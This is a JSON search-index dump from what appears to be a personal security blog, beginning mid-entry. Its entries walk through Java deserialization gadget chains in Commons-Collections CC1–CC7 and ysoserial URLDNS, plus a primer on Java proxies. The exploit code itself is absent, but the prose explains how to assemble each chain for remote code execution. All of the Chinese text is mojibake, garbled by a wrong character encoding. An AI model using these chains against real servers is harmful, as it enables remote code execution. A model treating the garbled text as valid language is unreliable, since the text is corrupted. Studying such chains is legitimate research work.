falseï¼Œåˆ™ä¸ä¼šæ‰§è¡Œå³ä¾§ä»£ç ï¼Œå³ä¸ä¼šæ‰§è¡Œ entry.key.equals(key)ï¼š CC6 + CC7åˆ†æ CC7çš„è¿‡ç¨‹ä¸­å¯ä»¥çœ‹åˆ° Hashtable.reconstitutionPutä¸­è°ƒç”¨äº† key.hashCodeæ–¹æ³•ï¼Œæ•…å¯ä»¥è”åˆåˆ©ç”¨ CC6ä¸­çš„ TiedMapEntry.hashCodeè¿›è¡Œç»„åˆåˆ©ç”¨ï¼š å®Œæ•´ EXP è°ƒç”¨é“¾æµç¨‹å›¾"},{"title":"Commons-Collections-CC2ã€CC4é“¾åˆ†æ","date":"2025-02-09T01:16:32.310Z","url":"/2025/02/09/CC4+CC2%E9%93%BE%E5%88%86%E6%9E%90/","tags":[["Java-Commons-Collections","/tags/Java-Commons-Collections/"]],"categories":[["Java-Commons-Collections","/categories/Java-Commons-Collections/"]],"content":"ä¹‹å‰çš„å‡ æ¡CCé“¾éƒ½æ˜¯ Commons-Collections 3.2.1ç‰ˆæœ¬ä¸­çš„ï¼ŒCC4å’ŒCC2é“¾æ˜¯ Commons-Collections 4.0ç‰ˆæœ¬ä¸­çš„ Javaååºåˆ—åŒ–åˆ©ç”¨é“¾ã€‚ CC4å®Œæ•´ EXP EXPæ„é€ é€»è¾‘1ã€åœ¨ Commons-Collections 4.0ä¸­æŸ¥æ‰¾ ChainedTransformer.transformçš„ç”¨æ³•ï¼Œå‘ç°åœ¨ TransformingComparator.compareä¸­è¢«è°ƒç”¨ï¼š 2ã€compareæ–¹æ³•å¯ä»¥åœ¨ PriorityQueue.siftDownUsingComparatorä¸­è¢«è°ƒç”¨ï¼Œcomparatorå¯ä»¥åœ¨ç±»æ„é€ å‡½æ•°ä¸­è¢«èµ‹å€¼å¯æ§ï¼š 3ã€PriorityQueue.siftDownUsingComparatorå¯ä»¥åœ¨ PriorityQueue.readObjectä¸­è¢«è°ƒç”¨ï¼š é—®ï¼šä¸ºä»€ä¹ˆ Commons-Collections 3.2.1ä¸­ä¸èƒ½åˆ©ç”¨è¿™æ¡é“¾å‘¢ï¼Ÿ ç­”ï¼šå› ä¸º Commons-Collections 3.2.1 ä¸­ TransformingComparatorç±»æ²¡æœ‰å®ç° Serializableæ¥å£ï¼Œä¸èƒ½è¢«ååºåˆ—åŒ–ï¼š åˆ©ç”¨é“¾æµç¨‹å›¾ CC2CC2çš„æ ¸å¿ƒæ€æƒ³è¿˜æ˜¯ CC4é“¾ï¼Œåªä¸è¿‡ CC2ä½¿ç”¨ InvokerTransformerç›´æ¥è°ƒç”¨ Templates.newTransformerï¼Œæ²¡åˆ©ç”¨ InstantiateTransformerã€‚ å®Œæ•´ EXP EXPæ„é€ é€»è¾‘ + æµç¨‹å›¾"},{"title":"Commons-Collections-CC5é“¾åˆ†æ","date":"2025-02-08T10:13:55.867Z","url":"/2025/02/08/CC5%E9%93%BE%E5%88%86%E6%9E%90/","tags":[["Java-Commons-Collections","/tags/Java-Commons-Collections/"]],"categories":[["Java-Commons-Collections","/categories/Java-Commons-Collections/"]],"content":"CC5å®Œæ•´ EXP EXPæ„é€ é€»è¾‘1ã€CC5è°ƒç”¨åˆ©ç”¨çš„æ˜¯ LazyMapç±»ä¸­çš„ getæ–¹æ³•æ¥è°ƒç”¨ chainedTrsformer.transformæ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚æ ¹æ®åˆ†æ CC6æ—¶çš„ç»éªŒï¼ŒTiedMapEntry.getValueæ–¹æ³•å¯ä»¥ç”¨æ¥è°ƒç”¨ LazyMap.getï¼š ä½†æ˜¯ CC5å¹¶éåƒ CC6ä¸­åˆ©ç”¨ hashCodeæ–¹æ³•æ¥è°ƒç”¨ getValueï¼Œè€Œæ˜¯ç”¨ toStringæ–¹æ³•ï¼š 2ã€toStringæ–¹æ³•å¯ä»¥åœ¨ BadAttributeValueExpException.readObjectä¸­è¢«è°ƒç”¨ï¼š valå€¼å¯æ§ï¼Œåœ¨æ„é€ å‡½æ•°ä¸­èµ‹å€¼ï¼š æ ¹æ®ä¸Šè¿°é€»è¾‘ï¼Œè¿™æ¡é“¾å­åŸºæœ¬é½äº†ï¼š æ„é€ æ³¨æ„ç‚¹ä½¿ç”¨æ„é€ å‡½æ•°ç»™ valèµ‹å€¼çš„æ—¶å€™ï¼Œè‹¥ valä¸ä¸º nullï¼Œåˆ™ä¼šå…ˆè°ƒç”¨ä¸€æ¬¡ val.toStringï¼Œæå‰å‘½ä»¤æ‰§è¡Œã€‚è¿™å’Œ CC6ä¸­çš„ HashMap.putæå‰è§¦å‘å‘½ä»¤æ‰§è¡Œçš„é€»è¾‘å¾ˆåƒã€‚ ä½†æ˜¯ CC5ä¸èƒ½é‡‡å– CC6çš„å¤„ç†æ–¹å¼ï¼Œå› ä¸º readObjectä¸­å¯¹ valObjçš„ç±»å‹è¿›è¡Œäº†åˆ¤æ–­ï¼Œå¦‚æœæ˜¯ Stringç±»å‹ï¼Œå°±ä¸ä¼šè§¦å‘ valObj.toStringï¼š æ•…è§£å†³æ–¹æ¡ˆæ˜¯å…ˆå°† valèµ‹å€¼ä¸º nullï¼Œåœ¨æ„é€ å‡½æ•°ä¸­ä¸è°ƒç”¨ toStringï¼Œå†åˆ©ç”¨å‘å°„ç»™ valèµ‹å€¼ï¼š åˆ©ç”¨é“¾æµç¨‹å›¾"},{"title":"Commons-Collections-CC3é“¾åˆ†æ","date":"2025-02-08T04:49:37.325Z","url":"/2025/02/08/CC3%E9%93%BE%E5%88%86%E6%9E%90/","tags":[["Java-Commons-Collections","/tags/Java-Commons-Collections/"]],"categories":[["Java-Commons-Collections","/categories/Java-Commons-Collections/"]],"content":"Commons-Collections CC3é“¾ä¸åŒäºå‰å‡ æ¡é“¾çš„å‘½ä»¤æ‰§è¡Œï¼Œè€Œæ˜¯å¯ä»¥åŠ è½½æ¶æ„å­—èŠ‚ç å®ç°ä»£ç æ‰§è¡Œã€‚ CC3é“¾æœ‰ä¸¤ç§è°ƒç”¨æ–¹å¼ï¼š (1) ä½¿ç”¨ InvokerTransformerè°ƒç”¨ Templates.newTransformer (2) ä½¿ç”¨ InstantiateTransformerç±» + TrAXFilterç±»è¿›è¡Œè°ƒç”¨ (å½“ InvokerTransformeråœ¨é»‘åå•ä¸­æ—¶) æ ¸å¿ƒåˆ©ç”¨é“¾ (TemplatesImpl.newTransformer) 1ã€_nameä¸èƒ½ä¸º nullï¼Œéœ€åˆ©ç”¨åå°„èµ‹å€¼ï¼ŒdefineTransletClassesåŠ è½½æ¶æ„ç±»åå®ä¾‹åŒ–æ‰§è¡Œä»»æ„ä»£ç ï¼Œè·Ÿè¿› defineTransletClassesï¼š 2ã€èµ‹å€¼bytecodesæ¶æ„å­—èŠ‚ç ï¼Œbytecodesæ˜¯ä¸€ä¸ªäºŒç»´æ•°ç»„ï¼Œåœ¨ forå¾ªç¯ä¸­åŠ è½½æ¶æ„ç±»ï¼Œä¸”æ¶æ„ç±»çš„çˆ¶ç±»å¿…é¡»æ˜¯ AbstractTransletï¼š EXPEvil.class (Evil.javaç¼–è¯‘å) exp CC3 + CC1-TransformedMapé“¾InvokerTransformerè°ƒç”¨EXP InstantiateTransformerè°ƒç”¨EXP æ„é€ é€»è¾‘1ã€æŸ¥æ‰¾ TemplatesImpl.transformerçš„ç”¨æ³•ï¼Œåœ¨ TrAXFilterç±»çš„æ„é€ å‡½æ•°ä¸­è¢«è°ƒç”¨ï¼Œtemplateså¯æ§ï¼š 2ã€å¯ä»¥åˆ©ç”¨ InstantiateTransformer.transformè·å–å…¶æ„é€ æ–¹æ³•å¹¶è¿›è¡Œå®ä¾‹åŒ–ï¼š æ ¹æ®æµç¨‹å›¾å¯çŸ¥ï¼ŒCC3ä¸ä»…å¯ä»¥å’Œ CC1- TransformedMapè”åˆåˆ©ç”¨ï¼Œå’Œ LazyMapé“¾ï¼ŒCC6ç­‰éƒ½æ˜¯å¯ä»¥çš„ã€‚ CC3 + CC1-LazyMapé“¾ CC3 + CC6"},{"title":"Commons-Collections-CC6é“¾åˆ†æ","date":"2025-02-07T08:18:19.041Z","url":"/2025/02/07/CC6%E9%93%BE%E5%88%86%E6%9E%90/","tags":[["Java-Commons-Collections","/tags/Java-Commons-Collections/"]],"categories":[["Java-Commons-Collections","/categories/Java-Commons-Collections/"]],"content":"Commons-Collections &lt;&#x3D; 3.2.1 CC6é“¾æ˜¯æ‰€æœ‰ gadget chainä¸­æœ€é€šç”¨çš„æ”»å‡»é“¾ã€‚CC6çš„ä¼˜åŠ¿æ˜¯ä¸ä¾èµ– jdkç‰ˆæœ¬è¿›è¡Œæ”»å‡»ã€‚ CC6é“¾çš„æ ¸å¿ƒæ€æƒ³å‚è€ƒ URLDNSé“¾ï¼Œåˆ©ç”¨ HashMap.readObjectè§¦å‘ hashæ–¹æ³•ï¼Œå†è§¦å‘ hashCodeç›´è‡³æ¼æ´ç‚¹ã€‚ å®Œæ•´EXP EXPæ„é€ é€»è¾‘1ã€ä¾ç„¶åˆ©ç”¨ LazyMap.getï¼ŒCC6é“¾åˆ©ç”¨äº† Commons-Collections 3.2.1ä¸­çš„ TiedMapEntryä¸­çš„ getValueæ–¹æ³•ï¼š 2ã€getValueæ–¹æ³•åœ¨ TiedMapEntry.hashCodeæ–¹æ³•ä¸­è¢«è°ƒç”¨ï¼š 3ã€å¦‚ä½•è°ƒç”¨ TiedMapEntry.hashCodeå°±æ˜¯ä¸‹ä¸€æ­¥é€»è¾‘ï¼Œå€Ÿç”¨ URLDNSé“¾çš„æ€æƒ³ï¼Œå¯ä»¥åˆ©ç”¨ HashMap.readObejctæ–¹æ³•è°ƒç”¨ hash(key)æ–¹æ³•ï¼Œè¿›è€Œè§¦å‘ key.hashCodeæ–¹æ³•ï¼š æ ¹æ®ä¸Šè¿°æ€è·¯ï¼Œåˆæ­¥æ„é€ EXPï¼š ä½†å¹¶éæ˜¯ç”± HashMap.readObjecté€ æˆçš„å‘½ä»¤æ‰§è¡Œï¼Œè€Œæ˜¯å’Œ URLDNSé“¾ç±»ä¼¼ï¼Œç”± hashMap.putæå‰è°ƒç”¨äº† hashæ–¹æ³•ï¼Œè§¦å‘ hashCodeé€ æˆçš„å‘½ä»¤æ‰§è¡Œï¼š å¯ä»¥å…ˆå°† LazyMapä¸­ factoryå±æ€§çš„å€¼è®¾ç½®ä¸º échainedTransformerï¼ŒhashMap.putç»“æŸåå†åˆ©ç”¨åå°„(factoryä¸º pricateå±æ€§) ä¿®æ”¹ factoryä¸º chainedTransformerï¼š ä½¿ç”¨ä¿®æ”¹åçš„ expæ‰§è¡Œååºåˆ—åŒ–ä»£ç ï¼Œæ— æ³•å‘½ä»¤æ‰§è¡Œï¼Œè·Ÿè¿› hashMap.putï¼Œæ­¥è¿›åˆ° LazyMap.getæ–¹æ³•ï¼Œåœ¨ç¬¬ä¸€æ¬¡putæ—¶ï¼Œè‹¥ lazyMapä¸­æ²¡æœ‰è¿™ä¸ª keyï¼Œä¼šè¿›å…¥ ifæ–¹æ³•è°ƒç”¨ factory.transformæ–¹æ³•ï¼Œç„¶åå°† keyæ·»åŠ åˆ° lazyMapä¸­ã€‚å½“ HashMap.readObjectè§¦å‘ LazyMap.getæ–¹æ³•æ—¶ï¼Œç”±äº keyå·²ç»è¢«æ·»åŠ åˆ° lazyMapä¸­ï¼Œæ•…ä¸ä¼šè¿›å…¥ ifé€»è¾‘ï¼Œç›´æ¥è¿”å›ï¼Œä¸ä¼šè§¦å‘å‘½ä»¤æ‰§è¡Œï¼š åœ¨ hashMap.putåå°† lazyMapä¸­çš„ keyå€¼ removeæ‰å°±å¯ä»¥äº†ï¼š è°ƒç”¨é“¾æµç¨‹å›¾"},{"title":"Ysoserial_URLDNSé“¾åˆ†æ","date":"2025-02-07T03:49:57.939Z","url":"/2025/02/07/Ysoserial_URLDNS%E9%93%BE%E5%88%86%E6%9E%90/","tags":[["Java-Commons-Collections","/tags/Java-Commons-Collections/"]],"categories":[["Java-Commons-Collections","/categories/Java-Commons-Collections/"]],"content":"å­¦ä¹  Commons-Collections CC6åˆ©ç”¨é“¾æ—¶é‡åˆ°äº† URLDNSé“¾ä¸­çš„é€»è¾‘ï¼Œæ•…å…ˆåˆ†æ URLDNSé“¾ï¼Œä¸º CC6é“¾æ‰“ä¸‹åŸºç¡€ã€‚ Ysoserial-URLDNS gadget chain:  å®Œæ•´EXP EXPæ„é€ é€»è¾‘1ã€HashMap.readObjectä¸­è°ƒç”¨äº† hashæ–¹æ³•ï¼š 2ã€HashMap.hash(Object key) æ¥æ”¶ Object keyå‚æ•°è°ƒç”¨ key.hashCode()ï¼š 3ã€URLç±»ä¸­ï¼ŒURL.hashCodeè°ƒç”¨äº† handler.hashCodeï¼š è·Ÿè¿› handler.hashCodeï¼Œè¿›å…¥åˆ° URLStreamHandler.hashCodeï¼Œè°ƒç”¨ getHostAddressï¼š 4ã€æ ¹æ®ä¸Šè¿°é€»è¾‘åˆæ­¥æ„é€ åˆ©ç”¨é“¾ä»£ç å¦‚ä¸‹ï¼š ä½†å­˜åœ¨é—®é¢˜ï¼ŒhashMap.putä¼šæå‰è§¦å‘ getHostAddresså¹¶ä¿®æ”¹ hashCodeçš„å€¼ä½¿ååºåˆ—åŒ–æ—¶æ— æ³•è§¦å‘ getHostAddressã€‚ å› ä¸ºåœ¨ hashMap.put(url, 1)æ—¶ä¼šæå‰è°ƒç”¨ä¸€æ¬¡ HashMap.hashæ–¹æ³•ï¼š ä»è€Œè§¦å‘ hashCodeæ–¹æ³•ï¼Œåœ¨ readObjectä¹‹å‰å…ˆè°ƒç”¨ä¸€æ¬¡ hashCodeï¼Œè§¦å‘ dnsè¯·æ±‚ï¼Œå¹¶ä¸” hashCodeçš„å€¼å‘ç”Ÿæ”¹å˜ï¼Œè¿™å°±æ„å‘³ç€ readObjectæ—¶çš„ hashCode !&#x3D; -1ä»è€Œç›´æ¥ return hashCodeï¼Œä¸ä¼šè§¦å‘ dnsè¯·æ±‚ï¼š ç”±äº URLç±»ä¸­çš„ hashCodeå±æ€§ä¸ºprivateï¼Œæ•…åˆ©ç”¨åå°„åœ¨ hashMap.putå‰ä¿®æ”¹ URL.hashCodeçš„å€¼ä¸ä¸º-1ï¼ŒhashMap.putåå†æ”¹å›-1å³å¯ï¼š URLDNSè°ƒç”¨é“¾æµç¨‹å›¾"},{"title":"Commons-Collections-CC1-LazyMapé“¾åˆ†æ","date":"2025-02-07T01:18:40.063Z","url":"/2025/02/07/CC1%E9%93%BE_LazyMap%E9%93%BE%E5%88%86%E6%9E%90/","tags":[["Java-Commons-Collections","/tags/Java-Commons-Collections/"]],"categories":[["Java-Commons-Collections","/categories/Java-Commons-Collections/"]],"content":"CC1é“¾é™¤äº† TransformedMapé“¾ä¹‹å¤–ï¼Œè¿˜å­˜åœ¨ LazyMapé“¾ã€‚LazyMapé“¾çš„æ ¸å¿ƒåŸç†æ˜¯ JavaåŠ¨æ€ä»£ç†ï¼Œå‰é¢ Blogå·²ç»è¯¦ç»†åˆ†æï¼Œè¿™é‡Œä¸åšèµ˜è¿°ã€‚ å®Œæ•´EXP EXPæ„é€ é€»è¾‘1ã€ä¾ç„¶æ˜¯æŸ¥æ‰¾ InvokerTransformer.transformçš„ç”¨æ³•ï¼Œåœ¨ LazyMap.getæ–¹æ³•ä¸­è¢«è°ƒç”¨ï¼š factoryåœ¨ LazyMap.decorateå’Œæ„é€ å‡½æ•°ä¸­å¯æ§ï¼š 2ã€AnnotationInvocationHandler.invokeæ–¹æ³•ä¸­è°ƒç”¨äº† memberValues.getæ–¹æ³•ï¼ŒmemberValueså¯æ§ï¼š AnnotationInvocationHandleræ˜¯ä¸€ä¸ªè°ƒç”¨å¤„ç†å™¨ï¼Œé…åˆ JavaåŠ¨æ€ä»£ç†å³å¯è°ƒç”¨ã€‚ è§‚å¯Ÿ invokeæ–¹æ³•çš„å‰æ–‡é€»è¾‘ï¼Œåˆ°è¾¾ getæ–¹æ³•å‰éœ€è¦å¯¹ methodè¿›è¡Œå¤šæ¬¡åˆ¤æ–­ï¼Œå³è°ƒç”¨å¤„ç†å™¨å¯¹è±¡è°ƒç”¨çš„æ–¹æ³•ä¸ä¸º equalsã€toStringã€hashCodeã€annotationTypeï¼Œä¸”ä¸ºæ— å‚æ–¹æ³•ã€‚ 3ã€AnnotationInvocationHandler.readObjectä¸­çš„ memberValues.entrySetç¬¦åˆæ¡ä»¶ï¼Œä»£ç† Mapæ¥å£è°ƒç”¨ memberValues.entrySetå°±ä¼šè§¦å‘ AnnotationInvocationHandler.invokeæ–¹æ³•ï¼š CC1å®Œæ•´è°ƒç”¨é“¾æµç¨‹å›¾"},{"title":"Javaè®¾è®¡æ¨¡å¼-é™/åŠ¨æ€ä»£ç†","date":"2025-02-06T06:22:01.134Z","url":"/2025/02/06/%E9%9D%99%E6%80%81%E4%B8%8E%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/","tags":[["Javaè®¾è®¡æ¨¡å¼","/tags/Java%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"]],"categories":[["Java-Commons-Collections","/categories/Java-Commons-Collections/"]],"content":"Javaé™æ€ä»£ç†Javaé™æ€ä»£ç†æ˜¯ Javaä¸­çš„ä¸€ç§è®¾è®¡æ¨¡å¼ã€‚é™æ€ä»£ç†å°±æ˜¯é€šè¿‡ä¸€ä¸ªä»£ç†å¯¹è±¡æ¥é—´æ¥è®¿é—®çœŸå®å¯¹è±¡ã€‚ä»£ç†ç±»ä¼šâ€œä»£ç†â€çœŸå®ç±»çš„è¡Œä¸ºï¼Œå¯ä»¥åœ¨ä»£ç†ç±»ä¸­æ·»åŠ é¢å¤–çš„åŠŸèƒ½æˆ–é€»è¾‘ï¼ˆä¾‹å¦‚æ—¥å¿—ã€æ€§èƒ½ç›‘æ§ç­‰ï¼‰ï¼Œè€Œä¸éœ€è¦ä¿®æ”¹çœŸå®ç±»çš„ä»£ç ã€‚ é¦–å…ˆå®šä¹‰ä¸€ä¸ªæ¥å£ subjectï¼š å®ç°ç±» SubjectImplå®ç°æ¥å£ä¸­çš„ request()æ–¹æ³•ï¼š é™æ€ä»£ç†ç±»ï¼Œä»£ç†çœŸå®çš„è¯·æ±‚ï¼ŒåŠ ä¸Šäº†ä¸€äº›é¢å¤–çš„å¤„ç†é€»è¾‘ (æ›´æ–°æ—¥å¿—ç­‰)ï¼š å®¢æˆ·ç±» Clientä½¿ç”¨é™æ€ä»£ç†çš„æ¨¡å¼è°ƒç”¨ request()æ–¹æ³•ï¼š é™æ€ä»£ç†çš„å¥½å¤„æ˜¯åœ¨ä¸ä¿®æ”¹çœŸå®ç±» (subjectImpl) çš„å‰æä¸‹ï¼Œä¸º (request) æ–¹æ³•å¢åŠ ä¸€äº›é¢å¤–çš„åŠŸèƒ½ï¼Œæ¯”å¦‚æ—¥å¿—ã€ç¼“å­˜ç­‰ã€‚ JavaåŠ¨æ€ä»£ç†JavaåŠ¨æ€ä»£ç†ä¹Ÿæ˜¯ä¸€ç§è®¾è®¡æ¨¡å¼ï¼Œç”± Java JDKæä¾›ï¼Œå¯ä»¥å‡å°‘å¾ˆå¤šé‡å¤ä»£ç ï¼Œæé«˜æ•ˆç‡ã€‚ å½“ Subjectæ¥å£ä¸­åªæœ‰ä¸€ç§æ–¹æ³•æ—¶ï¼Œé™æ€ä»£ç†çœ‹èµ·æ¥è¿˜ä¸é”™ï¼Œä½†å½“ Subjectæ¥å£ä¸­éœ€è¦å®ç°å¤šç§æ–¹æ³•æ—¶ï¼Œé™æ€ä»£ç†ä¼šä½¿ä»£ç åºæ‚å†—ä½™ï¼š è¿™ç§æƒ…å†µä¸‹ä½¿ç”¨åŠ¨æ€ä»£ç†ã€‚ InvocationHandler (è°ƒç”¨å¤„ç†å™¨) æ¥å£ -&gt; é€šè¿‡åå°„æœºåˆ¶ (invokeæ–¹æ³•) åŠ¨æ€ä»£ç†å¯¹è±¡ï¼š å®šä¹‰ SubjectInvocationHandlerç±»é€šè¿‡åå°„è¿›è¡ŒåŠ¨æ€ä»£ç†ï¼š å®¢æˆ·ç«¯é€šè¿‡ Proxy.newProxyInstanceåˆ›å»ºåŠ¨æ€ä»£ç†å¯¹è±¡ï¼Œåˆ†åˆ«æ¥æ”¶ä¸‰ä¸ªå‚æ•°ã€‚ (1) ClassLoader loader ç±»åŠ è½½å™¨ (ä¸å½±å“ invokeçš„æ‰§è¡Œ)ã€‚ (2) Class&lt;?&gt; [] interfaces è¢«ä»£ç†çš„æ¥å£(s) - æ•°ç»„ï¼Œè‹¥æŒ‡å®šäº† interfacesï¼Œä»£ç†å¯¹è±¡éƒ½è¢«è§†ä¸ºå®ç°äº† interfacesæ¥å£ï¼Œè°ƒç”¨ Interfacesæ¥å£æ—¶ï¼Œéƒ½ä¼šå…ˆç»è¿‡ InvocationHandler.invoke()æ–¹æ³•ã€‚ (3) InvocatonHandler h è°ƒç”¨å¤„ç†å™¨å¯¹è±¡ï¼Œé‡å†™å®šä¹‰äº† invoke()æ–¹æ³•ã€‚ åŠ¨æ€ä»£ç†ä¸­çš„å‘½ä»¤æ‰§è¡Œå½“ SubjectInvocationHandler.invoke()æ–¹æ³•ä¸­å­˜åœ¨å±é™©å‡½æ•°&#x2F;é€»è¾‘ç¼ºé™·ï¼š å¯ä»¥åˆ©ç”¨ Mapæ¥å£è°ƒç”¨ putæ–¹æ³•è§¦å‘ SubjectInvocationHandler.invoke()ï¼š "},{"title":"Commons-Collections-CC1é“¾åˆ†æ","date":"2025-02-05T03:10:18.404Z","url":"/2025/02/05/CC1%E9%93%BE%E5%88%86%E6%9E%90/","tags":[["Java-Commons-Collections","/tags/Java-Commons-Collections/"]],"categories":[["Java-Commons-Collections","/categories/Java-Commons-Collections/"]],"content":"è°ƒè¯•ç¯å¢ƒé…ç½®å¤ç°ç¯å¢ƒï¼šjdk1.8.0_65 (&#x2F;Library&#x2F;Java&#x2F;JavaVirtualMachines&#x2F;jdk1.8.0_65.jdk&#x2F;Contents&#x2F;Home) â€‹ .javaæºç  (&#x2F;Users&#x2F;gehansheng&#x2F;Desktop&#x2F;Javaä»£ç å®¡è®¡&#x2F;CCé“¾&#x2F;CC1&#x2F;jdk-af660750b2f4 â€‹  ä»“åº“ä¸­ä¸‹è½½ JDKæºç åŒ… â€‹ Commons-Collections 3.2.1 åŸå®‰è£…çš„ jdkæ–‡ä»¶å¤¹ä¸­çš„å¤šä¸º .classåç¼–è¯‘åçš„æ–‡ä»¶ï¼Œä»£ç ä¸æ˜“é˜…è¯»å’Œè°ƒè¯•ï¼Œæ›¿æ¢ä¸º .javaæºç æ–‡ä»¶å³å¯ã€‚ src&#x2F;share&#x2F;classes ä¸­ä¿å­˜ç€ Javaæ ‡å‡†åº“æºç  åŒç†ï¼Œä½¿ç”¨ mavenå¯¼å…¥ Commons-Collectionsä¾èµ–çš„æ—¶å€™ï¼Œmavenæ·»åŠ çš„ä¹Ÿæ˜¯ç¼–è¯‘åçš„ .classæ–‡ä»¶ï¼Œæ‰‹åŠ¨ä¸‹è½½æºä»£ç å³å¯ï¼š å®Œæ•´EXP EXPæ„é€ é€»è¾‘æ­£å¸¸ä½¿ç”¨ Javaåå°„å®ç°RCEé€»è¾‘ä¸åšèµ˜è¿° (1) Commons-Collections 3.2.1ä¸­ï¼Œå­˜åœ¨æ ¸å¿ƒæ¥å£ Transformerï¼Œæ˜¯ä¸€ç§å¯¹è±¡è½¬æ¢çš„æœºåˆ¶ï¼Œç”¨äºå°†ä¸€ä¸ªè¾“å…¥å¯¹è±¡è½¬æ¢ä¸ºå¦ä¸€ä¸ªè¾“å‡ºå¯¹è±¡ã€‚ (2) InvokerTransformerç±»å®ç°äº† Transformæ–¹æ³•ï¼Œå¯ä»¥é€šè¿‡åå°„è°ƒç”¨è¾“å…¥å¯¹è±¡çš„æ–¹æ³•ï¼š (3) InvokerTransformerä¸­çš„ transformæ–¹æ³•åœ¨ TransformedMapçš„ checkSetValueæ–¹æ³•ä¸­è¢«è°ƒç”¨ï¼š ![image-20250205162426065](&#x2F;Users&#x2F;gehansheng&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20250205162426065.png) è‹¥ valueTransformerçš„å€¼å¯æ§ï¼Œåˆ™å¯ä»¥å®ç°å‘½ä»¤æ‰§è¡Œã€‚ valueTransformerçš„å€¼åœ¨æ„é€ å‡½æ•° TransformedMapä¸­è¢«å®šä¹‰ï¼š ä½† TransformedMapæ„é€ å‡½æ•°çš„å±æ€§ä¸º protectedï¼Œprotectedå±æ€§ä¿®é¥°çš„æ–¹æ³•åªèƒ½è¢«å½“å‰ç±»&#x2F;å­ç±»è°ƒç”¨ï¼Œæ‰€ä»¥éœ€è¦æ‰¾ä¸€ä¸ªå½“å‰ç±»&#x2F;å­ç±»ä¸­è°ƒç”¨äº† TransformedMapæ„é€ æ–¹æ³•çš„ publicæ–¹æ³•ã€‚ å½“å‰ç±» publicæ–¹æ³• decorateè°ƒç”¨äº†æ„é€ æ–¹æ³• TransformedMapï¼š ç”±æ­¤ valueTransformerå¯æ§ï¼š (4) ç»§ç»­å‘ä¸Šæ‰¾ checkSetValueæ–¹æ³•åœ¨å“ªé‡Œè¢«è°ƒç”¨ï¼ŒTransformedMapçˆ¶ç±» AbstractInputCheckedMapDecoratorä¸­çš„ MapEntryç±»ä¸­çš„ setValueæ–¹æ³•è°ƒç”¨äº†å®ƒï¼š ä½¿ç”¨ forå¾ªç¯éå† transformedMapä¸­çš„é”®å€¼æ—¶ï¼Œè°ƒç”¨ setValueæ–¹æ³•ï¼Œè¿›è€Œè§¦å‘ checkSetValueæ–¹æ³•å®ç°å‘½ä»¤æ‰§è¡Œ (5) setValueæ–¹æ³•åœ¨ AnnotationInvocationHandler.readbjectæ–¹æ³•ä¸­è¢«è°ƒç”¨ï¼ŒåŒæ ·æ˜¯éå† Mapçš„åœºæ™¯ï¼Œè¿™æ¡é“¾å­å¤§è‡´å°±é½äº†ï¼š memberValuesçš„å€¼éœ€å¯æ§ï¼Œç±» AnnotationInvocationHandlerå’Œå…¶æ„é€ æ–¹æ³•æœªä½¿ç”¨ä»»ä½•è®¿é—®ä¿®é¥°ç¬¦è¿›è¡Œä¿®é¥°ï¼Œåªæœ‰åŒä¸€åŒ…ä¸­çš„ç±»å¯ä»¥è¿›è¡Œè®¿é—®è°ƒç”¨ã€‚ æ•…ä½¿ç”¨åå°„è¿›è¡Œè°ƒç”¨ï¼š typeçš„å±æ€§æ˜¯ä¸€ç§ Classæ³›å‹ï¼ŒAnnotationæ˜¯ Javaä¸­æ‰€æœ‰æ³¨è§£ç±»çš„çˆ¶ç±»ï¼Œæ‰€ä»¥ typeéœ€è¦èµ‹å€¼ä¸€ç§æ³¨è§£ç±»ã€‚ å‡ å¤„éœ€è¦æ³¨æ„çš„ gadget1ã€Runtimeç±»æ²¡æœ‰å®ç° java.io.Serializableæ¥å£ï¼Œä¸èƒ½è¢«åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œéœ€è¦ä½¿ç”¨åå°„æ¥é…åˆ InvokerTransformeræ„é€ ã€‚ æ­£å¸¸åå°„è°ƒç”¨ Runtime.getRuntime().exec()ï¼š é…åˆ InvokerTransformerï¼š å¯ä»¥åˆ©ç”¨ç±» ChainedTransformerä¸­ transformæ–¹æ³•å¯ä»¥é€’å½’è°ƒç”¨ InvokerTransformeræ–¹æ³•ï¼š 2ã€AnnotationInvocationHandler.readObjectçš„æ‰§è¡Œé€»è¾‘åˆ°è¾¾ memberValue.setValueä¹‹å‰ï¼Œéœ€è¦ç»è¿‡ä¸¤ä¸ª ifæ¡ä»¶ï¼š æ–­ç‚¹è°ƒè¯• readObejctçš„æ­¥è¿›é€»è¾‘å¯çŸ¥ï¼Œé¦–å…ˆä½¿ç”¨ annotationTypeè·å–æ³¨è§£ Overrideï¼Œæ¥ç€ä½¿ç”¨ annotationType.memberTypesè·å–æ³¨è§£æˆå‘˜ï¼Œé”®ä¸ºæ³¨è§£æˆå‘˜çš„å€¼ï¼Œå€¼ä¸ºæ³¨è§£æˆå‘˜çš„ç±»å‹ã€‚ æœ€ååˆ¤æ–­æ³¨è§£æˆå‘˜æ˜¯å¦å’ŒmemberValueçš„é”®å€¼ç›¸åŒï¼Œç›¸åŒåˆ™ä¸ä¸º nullï¼Œé€šè¿‡ ifåˆ¤æ–­ã€‚ ä½† Override.classä¸­æ— æˆå‘˜ï¼Œæ‰€ä»¥æ›´æ¢ä¸º Target.classï¼Œå¹¶ä¿®æ”¹ hashMapä¸­ä¼ å…¥çš„é”®å€¼ï¼š 3ã€æœ€åéœ€è¦ç¡®ä¿ setValueçš„å€¼å¯æ§ï¼Œè™½ç„¶ AnnotationInvocationHandler.readObjectä¸­å·²ç»ç¡®å®šäº† setValueçš„å€¼ï¼Œä½†å¯ä»¥åˆ©ç”¨ ConstantTransformerç±»ä¿®æ”¹ã€‚ ConstantTransformer.transformæ— è®ºè¾“å…¥æ•°æ®æ˜¯ä»€ä¹ˆï¼Œéƒ½è¿”å›å¸¸é‡ iConstantï¼ŒiConstantåœ¨æ„é€ å‡½æ•°ä¸­è¢«èµ‹å€¼ï¼Œåˆ©ç”¨ ConstantTransformerå’Œ ChainedTransformerå¯ä»¥æ§åˆ¶ setValueå€¼ï¼š 